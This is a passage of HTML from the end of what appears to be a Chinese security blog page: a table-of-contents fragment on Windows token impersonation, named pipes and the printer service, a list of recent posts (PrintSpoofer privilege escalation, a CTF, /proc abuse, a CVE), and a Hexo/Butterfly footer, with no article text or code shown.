href="#%E4%B8%BB%E4%BB%A4%E7%89%8C-Primary"><span class="toc-number">1.1.2.</span> <span class="toc-text">主令牌(Primary)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E6%8B%9F%E4%BB%A4%E7%89%8C"><span class="toc-number">1.1.3.</span> <span class="toc-text">模拟令牌</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ImpersonateNamedPipeClient"><span class="toc-number">1.2.</span> <span class="toc-text">ImpersonateNamedPipeClient()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E5%90%8D%E7%AE%A1%E9%81%93%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%85%B7%E4%BD%93%E5%AE%9E%E7%8E%B0"><span class="toc-number">1.3.</span> <span class="toc-text">命名管道服务端具体实现</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%89%93%E5%8D%B0%E6%9C%BAPrinter"><span class="toc-number">2.</span> <span class="toc-text">打印机Printer</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/14/PrintSpoofer%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/" title="PrintSpoofer提权漏洞">PrintSpoofer提权漏洞</a><time datetime="2026-04-14T13:05:30.000Z" title="发表于 2026-04-14 21:05:30">2026-04-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/03/31/polarisctf/" title="polarisctf">polarisctf</a><time datetime="2026-03-31T13:57:48.000Z" title="发表于 2026-03-31 21:57:48">2026-03-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/17/liunx%E7%B3%BB%E7%BB%9F%E4%B8%8B-proc%E7%9A%84%E5%88%A9%E7%94%A8/" title="liunx系统下/proc的利用">liunx系统下/proc的利用</a><time datetime="2026-01-17T07:45:14.000Z" title="发表于 2026-01-17 15:45:14">2026-01-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/11/xml-CVE-2024-48990/" title="xml&amp;CVE-2024-48990">xml&amp;CVE-2024-48990</a><time datetime="2026-01-11T05:51:24.000Z" title="发表于 2026-01-11 13:51:24">2026-01-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/30/NullByte1/" title="NullByte1">NullByte1</a><time datetime="2025-11-30T14:00:58.000Z" title="发表于 2025-11-30 22:00:58">2025-11-30</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div class="footer-other"><div class="footer-copyright"><span class="copyright">©&nbsp;2025 - 2026 By Wudalang</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.0.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.1"></script><script src="/js/main.js?v=5.5.1"></script><div class="js-pjax"></div><script src="/js/welcome.js"></script><script async="" data-pjax="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
